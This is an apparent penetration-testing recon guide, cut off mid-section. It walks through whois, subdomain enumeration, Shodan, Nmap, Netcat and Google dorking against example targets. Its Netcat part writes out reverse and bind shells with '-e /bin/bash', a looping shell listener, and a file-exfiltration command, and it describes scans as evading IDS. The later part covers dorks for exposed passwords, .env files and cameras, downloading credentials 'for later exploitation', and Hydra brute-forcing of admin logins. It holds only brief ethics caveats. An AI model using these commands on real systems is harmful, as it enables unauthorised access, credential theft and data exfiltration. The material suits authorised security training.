Recon Workflow Documentation


Start with Whois: Gather domain and registrant information.
Expand with Shodan: Identify exposed services, devices, or networks tied to your target.
Map the Network with Nmap: Identify hosts, open ports, and vulnerabilities.
Validate with Netcat: Test connectivity and banner grab to confirm findings.
Deep Dive with Google Dorking: Search for sensitive information on public web pages.





```
   --------
  |        |
 /  O   O  \
|    \_/    |
 \  -----   /
  |        |
   --------
```





 Step 1: Start with Whois

The first step in the recon workflow is to gather domain and registrant information using the Whois tool. This helps you understand who owns the domain, its registration details, and technical contacts.


 Objective:
Identify ownership, contact details, domain status, and other metadata for the target domain.



 Commands and Examples:

1. Basic Whois Query:
   Use the `whois` command to retrieve domain information.
   ```bash
   whois example.com
   ```

2. Key Information to Note:
   - Registrar: Name of the domain registrar.
   - Registrant: Name or organization that registered the domain.
   - Nameservers: DNS servers associated with the domain.
   - Expiration Date: When the domain will expire.
   - Status: Indicates if the domain is active, locked, etc.

   Sample Output:
   ```
   Domain Name: EXAMPLE.COM
   Registrar: NameCheap, Inc.
   Registrant Name: John Doe
   Registrant Email: johndoe@example.com
   Name Server: NS1.EXAMPLE.COM
   Name Server: NS2.EXAMPLE.COM
   Expiration Date: 2025-12-31
   ```

3. Query for Specific Fields:
   You can filter specific details (useful for scripting). For example:
   ```bash
   whois example.com | grep -E "Registrar|Registrant|Expiration|Name Server"
   ```

4. Automate for Multiple Domains:
   If you have a list of domains, loop through them.
   ```bash
   for domain in example.com testsite.org mysite.net; do
       echo "Querying $domain"
       whois $domain
   done
   ```

5. Check IP Whois:
   If you only have an IP address, query its registration details:
   ```bash
   whois 192.168.1.1
   ```



 Advanced Techniques:

1. Online Whois Services:
   Use websites like [whois.domaintools.com](https://whois.domaintools.com/) for additional visual insights or if the command-line tool is unavailable.

2. Historical Whois:
   Use specialized tools to retrieve historical domain ownership data (e.g., `whois-history` or services like SecurityTrails).

3. Check Domain Privacy:
   - Some domains may have privacy protection enabled. Example output:
     ```
     Registrant Name: REDACTED FOR PRIVACY
     ```
   - In such cases, look for associated DNS or MX records to pivot your investigation.

4. Combine with Subdomain Enumeration:
   Pair Whois data with subdomain enumeration tools to map related infrastructure.
   ```bash
   sublist3r -d example.com | while read sub; do whois $sub; done
   ```



 Output Documentation:
Organize the retrieved data into a structured format:
| Field            | Value               |
|-------------------|---------------------|
| Domain Name       | example.com         |
| Registrar         | NameCheap, Inc.     |
| Registrant Name   | John Doe            |
| Registrant Email  | johndoe@example.com |
| Name Servers      | ns1.example.com     |
| Expiration Date   | 2025-12-31          |




Domain and subdomain enumeration are critical steps in reconnaissance for mapping the attack surface of a target. Here's how to perform both effectively using various tools and techniques:



 Domain Enumeration
This involves identifying the main domain and its associated details.

 Steps:
1. Perform a Whois Lookup (covered in the previous step).
   - Gather domain registrar information, nameservers, and contact details.

2. Check for DNS Records:
   Use tools like `dig` or `nslookup` to retrieve DNS information.
   ```bash
   dig example.com ANY
   ```
   This command queries all available DNS records (A, MX, NS, TXT, etc.).

   Example:
   ```bash
   dig example.com MX   For mail exchange records
   nslookup example.com   Resolve domain to IP
   ```

3. Reverse DNS Lookup:
   Identify domains pointing to the same IP address.
   ```bash
   nslookup <IP address>
   ```



 Subdomain Enumeration: Detailed Exploration

Subdomain enumeration is the process of discovering additional domains or services under the main domain. This is crucial for finding attack vectors, hidden services, and mapping the target's attack surface. Below are the tools and techniques used for effective subdomain enumeration.



 Key Tools and Techniques for Subdomain Enumeration

 1. Sublist3r (Python-based Subdomain Enumeration Tool)
- Install Sublist3r:
  ```bash
  git clone https://github.com/aboul3la/Sublist3r.git
  cd Sublist3r
  pip install -r requirements.txt
  ```
  
- Basic Command to Discover Subdomains:
  ```bash
  python sublist3r.py -d example.com
  ```
  Explanation:
  - `-d`: Specifies the domain for which you are looking for subdomains (e.g., `example.com`).
  - Sublist3r performs passive subdomain discovery by querying search engines, DNS records, and other public sources.

- Output Example:
  ```bash
  [+] Subdomain Found: www.example.com
  [+] Subdomain Found: mail.example.com
  [+] Subdomain Found: dev.example.com
  ```

- Advanced Options:
  - Verbose Output:
    ```bash
    python sublist3r.py -d example.com -v
    ```
  - Save Results to File:
    ```bash
    python sublist3r.py -d example.com -o subdomains.txt
    ```
    Explanation: This saves the results to a text file for later analysis.

- Use Multiple Engines:
  - By default, Sublist3r uses multiple search engines like Google, Bing, and Yahoo for subdomain discovery. You can specify additional engines or change the default set.



 2. Amass (Comprehensive Subdomain Discovery Tool)
Amass is a powerful recon tool that uses both active and passive methods for subdomain enumeration. It integrates with several public sources and can also be used for brute-forcing subdomains.

- Install Amass:
  ```bash
  sudo apt install amass
  ```

- Basic Command:
  ```bash
  amass enum -d example.com
  ```
  Explanation:
  - `-d`: Specifies the domain to search for subdomains.
  - Output Example:
    ```
    example.com
    |- api.example.com
    |- dev.example.com
    |- mail.example.com
    ```

- Passive Mode (Only Passive Data Sources):
  ```bash
  amass enum -passive -d example.com
  ```
  Explanation:
  - This limits Amass to passive sources, meaning it won't interact directly with the target’s DNS or infrastructure.

- Active Mode (Active Enumeration):
  ```bash
  amass enum -active -d example.com
  ```
  Explanation:
  - In active mode, Amass attempts DNS resolution for discovered subdomains and directly queries DNS servers.

- Brute-Forcing Subdomains:
  - Using a wordlist with Amass:
    ```bash
    amass enum -brute -w /path/to/wordlist.txt -d example.com
    ```



 3. DNSRecon (DNS Enumeration Tool)
DNSRecon is another powerful tool for performing DNS queries, including checking for subdomains.

- Basic Command to Discover Subdomains:
  ```bash
  dnsrecon -d example.com
  ```
  Explanation:
  - This command performs standard DNS queries and attempts to identify subdomains.

- Brute-Force Subdomains with DNSRecon:
  ```bash
  dnsrecon -d example.com -t brt -w /path/to/wordlist.txt
  ```
  Explanation:
  - `-t brt`: Specifies brute force attack on DNS.
  - `-w`: Provides a wordlist for the brute force attack.
  
- Check for Additional DNS Records (MX, TXT, etc.):
  ```bash
  dnsrecon -d example.com -t axfr
  ```
  Explanation:
  - This tries to perform a zone transfer to retrieve all DNS records for the domain.



 4. Google Dorking for Subdomains
Google Dorking leverages Google search to find indexed subdomains. It's a passive reconnaissance method.

- Basic Google Dork Query:
  ```bash
  site:*.example.com -www
  ```
  Explanation:
  - `site:*.example.com`: Searches for all subdomains of `example.com`.
  - `-www`: Excludes the main `www` subdomain to focus on others.

- Find specific subdomains with keywords:
  ```bash
  site:example.com inurl:login
  ```
  Explanation:
  - This query finds any subdomain of `example.com` that contains the keyword `login` in its URL (useful for admin panels).



 5. Brute-Forcing Subdomains
If passive methods don’t uncover all subdomains, you can use brute-force methods to find subdomains based on common naming conventions.

- Using Gobuster (Fast Brute-Forcing):
  - Install Gobuster:
    ```bash
    sudo apt install gobuster
    ```
  - Brute-Force Subdomains:
    ```bash
    gobuster dns -d example.com -w /path/to/wordlist.txt
    ```
    Explanation:
    - `-d`: The domain name.
    - `-w`: The wordlist to use for brute-forcing (e.g., `common-subdomains.txt`).
  
- Using wfuzz (Flexible Brute-Forcing):
  ```bash
  wfuzz -c -w /path/to/wordlist.txt -u http://example.com -H "Host: FUZZ.example.com"
  ```
  Explanation:
  - `-c`: Outputs in color for easier analysis.
  - `FUZZ`: Replaces with each word from the wordlist during brute-forcing.



 6. Online Subdomain Enumeration Tools
Some online services can help enumerate subdomains passively.

- Using crt.sh:
  - Go to [crt.sh](https://crt.sh) and search for the domain `example.com`.
  - Explanation: This service returns subdomains found in SSL/TLS certificates. Often, organizations inadvertently expose subdomains through certificates.

- SecurityTrails:
  - Go to [SecurityTrails](https://securitytrails.com/) and search for the domain.
  - Explanation: It provides information about subdomains, historical data, and more.



 Automating the Process
To save time and efficiently collect subdomains from multiple sources, you can chain tools together:

```bash
 Run Sublist3r
python sublist3r.py -d example.com -o subdomains.txt

 Run Amass
amass enum -d example.com >> subdomains.txt

 Run DNSRecon for Brute-Forcing
dnsrecon -d example.com -t brt -w /path/to/wordlist.txt >> subdomains.txt

 Sort and remove duplicates
sort -u subdomains.txt -o unique_subdomains.txt
```



 What to Look For:
- Subdomain Structure: Common subdomains such as `www`, `dev`, `mail`, `api` often reveal specific infrastructure or services.
- Potential Attack Vectors: Subdomains hosting internal applications, admin panels, or staging sites can be a security risk if not properly secured.




 Subdomain Enumeration
Subdomain enumeration involves finding subdomains related to the target domain. Subdomains can often expose less secure applications or services.

 Tools and Techniques:

1. Using Sublist3r (Python-based tool):
   ```bash
   sublist3r -d example.com
   ```
   Output: A list of discovered subdomains.

2. Using Amass (Powerful recon tool):
   ```bash
   amass enum -d example.com
   ```
   Features: Combines passive and active methods for discovering subdomains.

3. Using DNS Enumeration Tools:
   - dnsenum: A Perl script for DNS enumeration.
     ```bash
     dnsenum example.com
     ```
   - dnsrecon: Another DNS recon tool.
     ```bash
     dnsrecon -d example.com
     ```

4. Google Dorking for Subdomains:
   Use advanced search queries to find indexed subdomains.
   ```
   site:*.example.com -www
   ```
   This query searches for all indexed subdomains under the main domain.

5. Online Subdomain Scanners:
   - Use platforms like [crt.sh](https://crt.sh) (Certificate Transparency Logs).
   - Query example:
     ```
     site:crt.sh example.com
     ```

6. Brute Forcing Subdomains:
   Use a wordlist to find subdomains via brute force.
   - Using Gobuster:
     ```bash
     gobuster dns -d example.com -w /path/to/wordlist.txt
     ```
   - Using wfuzz:
     ```bash
     wfuzz -c -w /path/to/wordlist.txt -u http://example.com -H "Host: FUZZ.example.com"
     ```

7. Passive Subdomain Discovery:
   Utilize OSINT techniques to gather subdomains without interacting with the target directly.
   - Certspotter:
     ```
     curl -s https://certspotter.com/api/v0/certs\?domain\=example.com | jq .
     ```
   - SecurityTrails API:
     Query for subdomains via their API.



 Combining Domain and Subdomain Enumeration
Automate the process to combine results from multiple tools:
```bash
sublist3r -d example.com > subdomains.txt
amass enum -d example.com >> subdomains.txt
sort -u subdomains.txt -o unique_subdomains.txt
```



 Organizing Findings:
Structure your findings in a table for clarity:
| Subdomain          | IP Address   | Service     |
|---------------------|--------------|-------------|
| mail.example.com    | 192.0.2.1    | SMTP        |
| dev.example.com     | 203.0.113.5  | Web Server  |
| api.example.com     | 192.0.2.45   | REST API    |



```
   --------
  |        |
 /  O   O  \
|    \_/    |
 \  -----   /
  |        |
   --------
```



 step 2: Shodan for Exposed Services and Devices

Shodan is a powerful search engine designed to locate internet-connected devices and services. It can provide detailed information about a target's exposed assets, including open ports, services, and vulnerabilities.



 Why Use Shodan in Recon?
- Identify publicly exposed services/devices.
- Gather details like software versions, configurations, and potential vulnerabilities.
- Pinpoint misconfigured devices and systems.



 Step-by-Step Guide to Using Shodan



 1. Shodan Web Interface
- Visit [Shodan.io](https://www.shodan.io) and create an account if you don’t already have one.
- Basic Search Query:
  - To find services tied to a domain or IP:
    ```text
    hostname:example.com
    ```
    Explanation: 
    - `hostname:` limits results to devices resolving to `example.com`.
  - For a specific IP address:
    ```text
    net:192.0.2.0/24
    ```
    Explanation: Searches for devices within the given IP range.



 2. Shodan Command-Line Interface (CLI)
Shodan CLI allows advanced searches and automation of queries. Install the CLI to perform searches directly from your terminal.

- Install Shodan CLI:
  ```bash
  pip install shodan
  ```
- Initialize Shodan CLI with API Key:
  - Obtain your API key from [your Shodan account](https://account.shodan.io/).
  ```bash
  shodan init <your_api_key>
  ```



 3. Basic Shodan CLI Commands

- Search for Devices by Domain:
  ```bash
  shodan search hostname:example.com
  ```
  Explanation:
  - Returns all devices tied to `example.com`.

- Search by IP Address:
  ```bash
  shodan host <IP_address>
  ```
  Explanation:
  - Provides detailed information about a specific IP address, including:
    - Open ports
    - Detected services
    - Hostnames and vulnerabilities

- Filter by Open Port:
  ```bash
  shodan search port:22 hostname:example.com
  ```
  Explanation:
  - Searches for devices under `example.com` with port `22` (SSH) open.

- Export Results to a File:
  ```bash
  shodan search hostname:example.com --limit 100 --fields ip_str,port,org --save output.json
  ```
  Explanation:
  - Saves results to `output.json` with fields for IP, port, and organization.



 4. Useful Shodan Search Filters

| Filter       | Description                                                   | Example                     |
|-------------------|-------------------------------------------------------------------|---------------------------------|
| `hostname:`       | Limits results to a specific domain                              | `hostname:example.com`          |
| `port:`           | Filters by open port                                             | `port:80`                       |
| `org:`            | Limits results to a specific organization                        | `org:Example Inc`               |
| `ssl:`            | Filters devices with specific SSL certificates                   | `ssl:example.com`               |
| `os:`             | Filters by operating system                                      | `os:Windows`                    |
| `product:`        | Filters by software or service name                              | `product:nginx`                 |
| `country:`        | Filters results to a specific country                            | `country:KE`                    |



 5. Shodan Query Examples

- Find Apache Web Servers:
  ```text
  product:Apache
  ```
- Search for Exposed Databases:
  ```text
  product:MySQL
  ```
- Identify Publicly Accessible Remote Desktop Protocol (RDP):
  ```text
  port:3389
  ```
- Locate Devices Exposed by the Target:
  ```text
  hostname:example.com port:443
  ```



 6. Automating Recon with Shodan

Combine Shodan results with other tools to enhance your reconnaissance workflow:

- Export Results for Further Analysis:
  ```bash
  shodan search hostname:example.com --fields ip_str,port --limit 100 > results.txt
  ```
- Integrate with Nmap for Scanning:
  - Use the exported IPs in a file with Nmap:
    ```bash
    nmap -iL results.txt -sV -T4
    ```



 7. What to Look For in Shodan Results
- Open Ports: Are there unnecessary services exposed?
- Banner Information: Check software versions for vulnerabilities.
- SSL Certificates: Misconfigured or self-signed certificates.
- Geolocation Data: Understand where services are hosted.
- Vulnerabilities: Shodan flags known CVEs for detected software.



 Example Workflow

1. Perform a basic query on the domain:
   ```bash
   shodan search hostname:example.com
   ```
2. Save the results to a file:
   ```bash
   shodan search hostname:example.com --fields ip_str,port --save results.json
   ```
3. Review the results for exposed services and use them for follow-up with tools like Nmap or Netcat.





```
   --------
  |        |
 /  O   O  \
|    \_/    |
 \  -----   /
  |        |
   --------
```


 step 3: Network Mapping with Nmap

Nmap (Network Mapper) is a powerful tool for discovering hosts, open ports, services, and potential vulnerabilities in a network. It is a core tool in any recon workflow.




 Why Use Nmap?
- Identify live hosts in a network.
- Enumerate open ports and services.
- Detect running software versions and operating systems.
- Uncover potential vulnerabilities.


 Step-by-Step Guide to Using Nmap



 1. Basic Network Discovery
Discover live hosts in a network.

- Command:
  ```bash
  nmap -sn 192.168.1.0/24
  ```
  Explanation:
  - `-sn`: Disables port scanning; only performs host discovery.
  - `192.168.1.0/24`: Specifies the subnet to scan.

- Output Example:
  ```
  Nmap scan report for 192.168.1.1
  Host is up.
  Nmap scan report for 192.168.1.10
  Host is up.
  ```



 2. Port Scanning
Identify open ports and associated services.

- Command:
  ```bash
  nmap -p 1-1000 192.168.1.10
  ```
  Explanation:
  - `-p 1-1000`: Scans the first 1000 ports.
  - `192.168.1.10`: The target IP address.

- Output Example:
  ```
  PORT    STATE  SERVICE
  22/tcp  open   ssh
  80/tcp  open   http
  ```

- Scan All Ports:
  ```bash
  nmap -p- 192.168.1.10
  ```
  Explanation: Scans all 65,535 TCP ports.





 3. Service and Version Detection
Gather detailed information about services running on open ports.

- Command:
  ```bash
  nmap -sV 192.168.1.10
  ```
  Explanation:
  - `-sV`: Enables version detection for services.

- Output Example:
  ```
  PORT    STATE  SERVICE    VERSION
  22/tcp  open   ssh        OpenSSH 7.6p1 Ubuntu
  80/tcp  open   http       Apache httpd 2.4.29
  ```





 4. OS Detection
Detect the operating system running on the target.

- Command:
  ```bash
  nmap -O 192.168.1.10
  ```
  Explanation:
  - `-O`: Enables OS detection.

- Output Example:
  ```
  OS details: Linux 3.10 - 4.11 (general-purpose)
  ```





 5. Aggressive Scan
Perform a comprehensive scan with more detailed output.

- Command:
  ```bash
  nmap -A 192.168.1.10
  ```
  Explanation:
  - `-A`: Enables aggressive mode, which includes OS detection, service version detection, script scanning, and traceroute.




 6. Scan Multiple Targets
- Command:
  ```bash
  nmap -p 80,443 192.168.1.10 192.168.1.20
  ```
  Explanation:
  - Scans ports `80` and `443` on two IPs: `192.168.1.10` and `192.168.1.20`.

- Scan a Range of IPs:
  ```bash
  nmap 192.168.1.10-20
  ```




 7. Detect Vulnerabilities
Use Nmap scripts (NSE - Nmap Scripting Engine) to check for known vulnerabilities.

- Command:
  ```bash
  nmap --script vuln 192.168.1.10
  ```
  Explanation:
  - `--script vuln`: Runs scripts to identify vulnerabilities.

- Example Output:
  ```
  PORT    STATE  SERVICE
  80/tcp  open   http
  | http-vuln-cve2017-5638:
  |   VULNERABLE:
  |   Apache Struts S2-045 Remote Code Execution
  ```




 8. Save Scan Results
- Command:
  ```bash
  nmap -oN scan.txt 192.168.1.10
  ```
  Explanation:
  - `-oN`: Saves results in a human-readable format to `scan.txt`.

- Save as XML for Further Analysis:
  ```bash
  nmap -oX scan.xml 192.168.1.10
  ```




 9. Combine with Previous Recon Data
- Use results from Shodan or Whois to target specific IPs or ports.

  Example Workflow:
  - Export IPs from Shodan:
    ```bash
    shodan search hostname:example.com --fields ip_str > ips.txt
    ```
  - Scan those IPs with Nmap:
    ```bash
    nmap -iL ips.txt -sV
    ```



 What to Look For in Nmap Scans
- Open Ports: Identify services that shouldn't be exposed (e.g., database ports).
- Software Versions: Look for outdated or vulnerable versions.
- OS Fingerprinting: Confirm the operating system to tailor potential exploits.
- Unusual Services: Services on non-standard ports or unexpected services.




```
   --------
  |        |
 /  O   O  \
|    \_/    |
 \  -----   /
  |        |
   --------
```

 step 4: Netcat for Connectivity and Banner Grabbing

Netcat (often called the "Swiss Army knife of networking") is a versatile tool used for testing connectivity, grabbing banners, and even transferring files. It complements earlier steps in reconnaissance by verifying findings and gathering additional details.



 Why Use Netcat in Recon?
- Test connectivity to specific ports and services.
- Grab banners to identify software versions.
- Perform manual probes on open ports for deeper analysis.



 Step-by-Step Guide to Using Netcat



 1. Basic Connectivity Test
Check if a port is open and responding.

- Command:
  ```bash
  nc -vz 192.168.1.10 80
  ```
  Explanation:
  - `-v`: Enables verbose output.
  - `-z`: Scans without sending data; just checks connectivity.
  - `192.168.1.10`: The target IP.
  - `80`: The target port.

- Output Example:
  ```
  Connection to 192.168.1.10 80 port [tcp/http] succeeded!
  ```



 2. Banner Grabbing
Gather information about a service running on an open port.

- Command:
  ```bash
  nc 192.168.1.10 80
  ```
  Steps:
  - After running the command, type a simple HTTP request (e.g., `GET / HTTP/1.1`) and press Enter twice:
    ```
    GET / HTTP/1.1
    Host: 192.168.1.10
    ```
  - Output Example:
    ```
    HTTP/1.1 200 OK
    Server: Apache/2.4.41 (Ubuntu)
    Content-Type: text/html
    ```

  Explanation:
  - This reveals the web server type (`Apache/2.4.41`) and other details like the HTTP status and content type.



 3. Scanning Multiple Ports
Probe multiple ports to find open ones.

- Command:
  ```bash
  nc -vz 192.168.1.10 20-100
  ```
  Explanation:
  - `20-100`: Scans ports in the range 20 to 100.

- Output Example:
  ```
  Connection to 192.168.1.10 22 port [tcp/ssh] succeeded!
  Connection to 192.168.1.10 80 port [tcp/http] succeeded!
  ```



 4. Test Specific Protocols
Interact with services using known protocols.

- Command (SMTP Example):
  ```bash
  nc 192.168.1.10 25
  ```
  Steps:
  - Type the `HELO` command to interact with the SMTP server:
    ```
    HELO example.com
    ```
  - Output Example:
    ```
    250 Hello example.com, pleased to meet you
    ```

- Command (FTP Example):
  ```bash
  nc 192.168.1.10 21
  ```
  Output Example:
    ```
    220 Welcome to the FTP server
    ```




 5. File Transfers
Netcat can transfer files between systems.

- Command to Send a File:
  ```bash
  nc -l -p 1234 < file.txt
  ```
  Explanation:
  - `-l`: Listens for incoming connections.
  - `-p 1234`: Uses port 1234.

- Command to Receive a File:
  ```bash
  nc 192.168.1.10 1234 > received.txt
  ```



 6. Reverse Shell (Ethical Use Only)
Netcat can establish a reverse shell to test system vulnerabilities (only with proper authorization).

- On the Attacker Machine (Listener):
  ```bash
  nc -l -p 4444
  ```
- On the Target Machine (Reverse Connection):
  ```bash
  nc 192.168.1.10 4444 -e /bin/bash
  ```
  Explanation:
  - `-e /bin/bash`: Executes `/bin/bash` upon connection.



 7. Automate with Nmap Output
Combine Netcat with Nmap results to test open ports interactively.

- Export open ports with Nmap:
  ```bash
  nmap -p 1-1000 -oG ports.txt 192.168.1.10
  ```
- Parse and feed ports into Netcat:
  ```bash
  grep "open" ports.txt | awk '{print $2}' | while read port; do nc -vz 192.168.1.10 $port; done
  ```



 8. Important Notes on Netcat
- Always test Netcat commands in controlled environments or with explicit permission.
- Use `nc.traditional` for reverse shells on some Linux distributions if the `-e` option is missing.



 Key Use Cases for Netcat in Recon
- Verify service presence after scanning with Nmap or Shodan.
- Perform manual protocol-specific interaction for deeper insights.
- Gather banners to identify software and its potential vulnerabilities.




 Advanced Netcat Use Cases

 1. Advanced Banner Grabbing
Sometimes services require specific protocols to trigger banner responses. Here are examples for common protocols:

- HTTP Advanced Example:
  ```bash
  nc 192.168.1.10 80
  ```
  Steps:
  - After connecting, type an advanced HTTP request:
    ```
    HEAD / HTTP/1.1
    Host: 192.168.1.10
    User-Agent: Mozilla/5.0
    ```
  - Press Enter twice.
  - Why Use `HEAD`?
    The `HEAD` method retrieves header information without transferring the body, which is faster for banner identification.



 2. Interactive Probing
Netcat can interact with services to extract additional data.

- SSH Example:
  ```bash
  nc 192.168.1.10 22
  ```
  Expected Output:
  ```
  SSH-2.0-OpenSSH_7.4
  ```
  Why Useful?
  - Reveals the SSH version, which can indicate vulnerabilities.
  - Manual interaction ensures no automated detection skips this step.

- Telnet-Style Probing:
  ```bash
  nc 192.168.1.10 23
  ```
  After connecting, manually type credentials or commands for deeper testing.



 3. Advanced Port Scanning Techniques
Netcat can bypass firewalls and intrusion detection systems (IDS) by mimicking legitimate traffic.

- Stealth Scanning:
  ```bash
  nc -v -z 192.168.1.10 20-100 -w 1
  ```
  Explanation:
  - `-w 1`: Waits for 1 second before timing out.
  - Reduces noise compared to automated tools like Nmap.

- Randomized Port Scanning:
  ```bash
  for port in $(shuf -i 1-1000 -n 50); do nc -vz 192.168.1.10 $port; done
  ```
  Explanation:
  - `shuf -i 1-1000 -n 50`: Randomly selects 50 ports between 1 and 1000.
  - Reduces predictability to evade detection.



 4. Testing Vulnerabilities
Netcat allows manual testing for specific service vulnerabilities.

- SMTP Example (Open Relay Testing):
  ```bash
  nc 192.168.1.10 25
  ```
  After connecting, type:
  ```
  HELO example.com
  MAIL FROM:<attacker@example.com>
  RCPT TO:<victim@example.com>
  ```
  Why Useful?
  - Identifies if the server accepts emails for unauthorized domains, a sign of misconfiguration.



 5. Data Exfiltration Simulation
Netcat can simulate data exfiltration for penetration testing.

- Command:
  On the "attacker" machine:
  ```bash
  nc -l -p 5555 > stolen_data.txt
  ```
  On the target machine:
  ```bash
  nc 192.168.1.10 5555 < sensitive_data.txt
  ```
  Explanation:
  - Simulates unauthorized file transfers to identify if data loss prevention (DLP) tools detect it.



 6. Reverse and Bind Shells
Netcat is essential for testing shell access vulnerabilities.  

- Reverse Shell Example:
  On the attacker machine:
  ```bash
  nc -l -p 1234
  ```
  On the target machine:
  ```bash
  nc 192.168.1.10 1234 -e /bin/bash
  ```
  What Happens?
  - The attacker gains shell access to the target.

- Bind Shell Example:
  On the target machine:
  ```bash
  nc -l -p 5555 -e /bin/bash
  ```
  On the attacker machine:
  ```bash
  nc 192.168.1.10 5555
  ```



 7. Persistent Listener
Keep Netcat listening persistently for connections, ideal for ongoing testing.

- Command:
  ```bash
  while true; do nc -l -p 4444 -e /bin/bash; done
  ```
  Explanation:
  - Ensures the listener restarts automatically after each connection.



 8. Service Spoofing
Netcat can mimic a legitimate service to observe how other systems interact with it.

- Command:
  ```bash
  nc -l -p 80 -c 'echo -e "HTTP/1.1 200 OK\n\nFake Server"'
  ```
  Explanation:
  - Mimics a web server responding with "Fake Server" for testing.



 9. Manually Crafting Packets
Send custom-crafted packets to test specific service responses.

- Command:
  ```bash
  echo -e "GET /admin HTTP/1.1\nHost: 192.168.1.10\n" | nc 192.168.1.10 80
  ```
  Why Useful?
  - Simulates HTTP requests, even with custom headers, to identify vulnerabilities or misconfigurations.



 10. Combining Netcat with Other Tools
Netcat works well in conjunction with other tools.

- Example (Automating with Nmap):
  Export open ports with Nmap:
  ```bash
  nmap -p 1-1000 -oG open_ports.txt 192.168.1.10
  ```
  Use Netcat for detailed probing:
  ```bash
  awk '/open/{print $2}' open_ports.txt | while read port; do nc -v 192.168.1.10 $port; done
  ```

- Example (Using Output from Shodan):
  Export results from Shodan and pipe them to Netcat for connectivity testing.



 Key Takeaways for Advanced Use
- Customization: Netcat commands can be tailored for specific tests.
- Stealth: Low-profile testing minimizes detection risk.
- Integration: Combines well with earlier recon tools like Nmap and Shodan.


```
   --------
  |        |
 /  O   O  \
|    \_/    |
 \  -----   /
  |        |
   --------
```


 Step 5: Google Dorking for Sensitive Information Discovery

Google Dorking, also known as Google hacking, leverages advanced search operators to find sensitive information unintentionally exposed on the web. It's a powerful reconnaissance technique to identify misconfigurations, exposed data, and overlooked vulnerabilities.



 Why Use Google Dorking in Recon?
- Locate exposed files (e.g., configuration files, logs).
- Identify misconfigured web servers and directories.
- Discover indexed information that shouldn't be public.



 How Google Dorking Works
Google's advanced search operators narrow down search results to specific criteria. Below is a breakdown of useful operators and their applications.



 Step-by-Step Guide to Google Dorking



 1. Basic Syntax
Search operators refine queries and improve search focus.

- Operator:
  ```
  site:example.com
  ```
  Explanation:
  - Limits the search to results from `example.com`.

- Example:
  ```bash
  site:example.com
  ```
  Purpose: Locate all publicly available content under a specific domain.



 2. Locate Specific File Types
Find files of interest (e.g., documents, configuration files).

- Operator:
  ```
  filetype:pdf
  ```
  Example:
  ```bash
  site:example.com filetype:pdf
  ```
  Explanation:
  - Finds all PDF files on `example.com`.

- Common File Types for Recon:
  - `doc`, `docx`: Documents
  - `xls`, `xlsx`: Spreadsheets
  - `txt`, `log`: Text and logs
  - `sql`: Database dumps
  - `xml`, `json`, `conf`: Configuration files



 3. Find Exposed Directories
Identify web directories or pages not meant for public access.

- Operator:
  ```
  intitle:index.of
  ```
  Example:
  ```bash
  site:example.com intitle:index.of
  ```
  Explanation:
  - Searches for directory listings with exposed content.



 4. Search for Admin Pages
Locate administrative panels or login portals.

- Operator:
  ```
  inurl:admin
  ```
  Example:
  ```bash
  site:example.com inurl:admin
  ```
  Explanation:
  - Finds URLs containing "admin," which often point to login pages or admin portals.





 5. Search for Sensitive Keywords
Uncover documents or pages containing sensitive keywords.

- Operator:
  ```
  intext:"password"
  ```
  Example:
  ```bash
  site:example.com intext:"password"
  ```
  Explanation:
  - Searches for the word "password" within the content of pages on `example.com`.





 6. Combine Operators
Enhance search precision by combining multiple operators.

- Example:
  ```bash
  site:example.com filetype:sql intext:"password"
  ```
  Explanation:
  - Searches for SQL files containing the keyword "password" on `example.com`.





 7. Find Login Pages
Locate login pages that may reveal system access points.

- Operator:
  ```
  inurl:login
  ```
  Example:
  ```bash
  site:example.com inurl:login
  ```
  Explanation:
  - Targets URLs with "login" in them, commonly used for authentication portals.




 8. Uncover Misconfigured Databases
Search for database connection strings or exposed database credentials.

- Example:
  ```bash
  site:example.com ext:env | ext:sql "DB_HOST"
  ```
  Explanation:
  - Finds `.env` files or SQL files containing the string "DB_HOST," which often includes sensitive database configuration.




 9. Publicly Exposed Cameras
Discover unsecured IP cameras indexed by Google.

- Example:
  ```bash
  inurl:"/view/view.shtml"
  ```
  Explanation:
  - Finds pages with unsecured camera feeds.



 10. Default Credentials and Configuration Files
Locate misconfigured default credentials or exposed settings.

- Example:
  ```bash
  inurl:config filetype:xml
  ```
  Explanation:
  - Searches for configuration files in XML format.



 Practical Recon Examples

1. Search for Sensitive PDF Reports:
   ```bash
   site:example.com filetype:pdf "confidential"
   ```
   - Reveals confidential PDF files on the target domain.

2. Find Default Apache Configurations:
   ```bash
   intitle:"Apache2 Ubuntu Default Page"
   ```
   - Identifies unprotected default web server pages.

3. Search for Backup Files:
   ```bash
   site:example.com ext:bak | ext:old | ext:backup
   ```
   - Locates old or backup files.



 Tools to Automate Google Dorking
Automating Dorking with tools can increase efficiency.

- GoogD0rker: Python script for automated Google Dorking.
- Google Hacking Database (GHDB): A repository of pre-built dork queries maintained by Offensive Security.



 Ethical Considerations
- Always respect privacy laws and avoid accessing information without explicit permission.
- Google Dorking can identify sensitive information inadvertently exposed. Notify the owner if misconfigurations are discovered.



 Key Takeaways
- Use advanced operators (`site:`, `filetype:`, `inurl:`) to narrow searches.
- Combine operators for precise queries.
- Use tools like GHDB for pre-built queries.





 Applying Google Dorking Results in Reconnaissance

After uncovering sensitive information using Google Dorking, the findings can provide significant value during reconnaissance by revealing vulnerabilities, data leaks, and misconfigurations. Here's a structured approach to effectively apply the results:



 1. Analyze Discovered Files and Directories

 A. File Analysis
- Steps:
  1. Download the exposed files.
  2. Inspect file contents for sensitive information:
     - Configuration details (e.g., `.env` files).
     - Hardcoded credentials.
     - API keys.
     - Database connection strings.

- Example Command (Downloading Files via Terminal):
  ```bash
  wget http://example.com/.env
  ```
- How to Use:
  - Extract credentials or sensitive parameters for later exploitation (e.g., SSH, database login attempts).

 B. Directory Analysis
- Discovered Index Pages:
  Review directory listings found using:
  ```bash
  intitle:index.of
  ```
- How to Use:
  - Look for file backups (`.bak`), unprotected zip files, or other sensitive resources that may contain valuable data.



 2. Exploit Misconfigured Services

 A. Web Application Admin Portals
- Target:
  Admin pages located using:
  ```bash
  site:example.com inurl:admin
  ```
- Steps:
  1. Visit the discovered pages in a browser.
  2. Test default credentials (e.g., `admin:admin` or `root:toor`).
  3. Use brute-forcing tools like Hydra or Burp Suite to crack passwords.

- Hydra Example for Admin Login:
  ```bash
  hydra -l admin -P passwords.txt example.com http-post-form "/admin.php:username=^USER^&password=^PASS^:F=incorrect"
  ```

 B. Misconfigured Services
- Use discovered services to pivot into the network.
  - If a misconfigured database (`DB_HOST`) is found, connect using MySQL CLI:
    ```bash
    mysql -u root -h 192.168.1.10 -p
    ```



 3. Leverage Exposed Source Code

 A. Code and Configuration Files
- Target:
